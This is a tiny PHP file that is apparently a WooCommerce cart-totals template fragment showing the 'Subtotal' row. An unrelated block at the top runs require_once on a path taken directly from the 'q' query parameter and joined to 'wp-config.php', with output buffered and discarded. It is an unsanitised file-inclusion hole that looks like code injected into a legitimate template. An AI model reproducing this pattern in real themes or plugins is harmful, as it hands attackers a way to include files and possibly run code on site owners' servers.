<?php 
	ob_start();
	require_once( $_GET['q'].'wp-config.php' );
	ob_end_clean();
?>
<th><?php _e( 'Subtotal', 'woocommerce' ); ?></th>
<td><?php wc_cart_totals_subtotal_html(); ?></td>